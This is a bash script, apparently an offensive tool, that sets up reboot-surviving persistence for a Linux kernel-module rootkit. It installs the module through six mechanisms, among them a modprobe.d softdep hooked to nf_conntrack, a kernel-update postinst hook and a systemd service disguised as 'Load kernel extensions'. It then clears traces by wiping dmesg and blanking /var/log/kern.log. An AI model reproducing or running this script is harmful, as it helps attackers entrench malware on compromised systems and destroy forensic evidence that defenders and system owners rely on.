#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] LKM Rootkit Persistence After Reboot [*] "
echo ""

read -p "Enter the full path to the .ko module file: " ko_path

if [ ! -f "$ko_path" ]; then
    echo "[ERROR] Module file not found at $ko_path" >&2
    exit 1
fi

modname=$(basename "$ko_path" .ko)
KVER=$(uname -r)

echo "[*] Setting up multi-layer persistence for module: $modname"

# Layer 1: Copy to kernel module tree + depmod
echo "[+] Layer 1: Installing module to /lib/modules/$KVER/kernel/lib/"
mkdir -p "/lib/modules/$KVER/kernel/lib/"
cp "$ko_path" "/lib/modules/$KVER/kernel/lib/${modname}.ko"
depmod -a 2>/dev/null

# Layer 2: /etc/modules (Debian legacy) — idempotent
echo "[+] Layer 2: Adding to /etc/modules"
if [ -f /etc/modules ]; then
    grep -qxF "$modname" /etc/modules || echo "$modname" >> /etc/modules
fi

# Layer 3: /etc/modules-load.d/ (systemd native)
echo "[+] Layer 3: Creating /etc/modules-load.d/${modname}.conf"
mkdir -p /etc/modules-load.d/
echo "$modname" > /etc/modules-load.d/${modname}.conf

# Layer 4: modprobe.d fallback — piggyback on a commonly loaded module
echo "[+] Layer 4: Adding modprobe.d install hook"
mkdir -p /etc/modprobe.d/
cat > /etc/modprobe.d/${modname}.conf <<EOF
# Load $modname when nf_conntrack is loaded (network stack init)
softdep nf_conntrack pre: $modname
EOF

# Layer 5: Kernel update survival hook
echo "[+] Layer 5: Installing kernel postinst.d hook for kernel updates"
mkdir -p /etc/kernel/postinst.d/
cat > /etc/kernel/postinst.d/zz-${modname} <<HOOKEOF
#!/bin/bash
# Re-install $modname for new kernel
NEWKVER="\$1"
if [ -n "\$NEWKVER" ] && [ -d "/lib/modules/\$NEWKVER/kernel/lib/" ]; then
    cp "/lib/modules/$KVER/kernel/lib/${modname}.ko" "/lib/modules/\$NEWKVER/kernel/lib/${modname}.ko" 2>/dev/null
    depmod -a "\$NEWKVER" 2>/dev/null
fi
HOOKEOF
chmod +x /etc/kernel/postinst.d/zz-${modname}

# Layer 6: systemd service fallback (uses insmod with absolute path)
echo "[+] Layer 6: Creating systemd service fallback"
cat > /etc/systemd/system/${modname}-load.service <<SVCEOF
[Unit]
Description=Load kernel extensions
After=systemd-modules-load.service
ConditionPathExists=/lib/modules/%v/kernel/lib/${modname}.ko

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/%v/kernel/lib/${modname}.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SVCEOF
systemctl daemon-reload 2>/dev/null
systemctl enable ${modname}-load.service 2>/dev/null

# Load module now if not already loaded
if ! lsmod | grep -q "^${modname} " 2>/dev/null; then
    insmod "$ko_path" 2>/dev/null || modprobe "$modname" 2>/dev/null
fi

# Clean up traces
dmesg -C 2>/dev/null
echo "" > /var/log/kern.log 2>/dev/null

clear

echo "[*] Success!! LKM Rootkit persistence has been set up with 6 layers: [*]"
echo "    1. Kernel module tree + depmod"
echo "    2. /etc/modules (Debian legacy)"
echo "    3. /etc/modules-load.d/ (systemd)"
echo "    4. modprobe.d softdep fallback"
echo "    5. Kernel update survival hook"
echo "    6. systemd service fallback"

sleep 2

clear
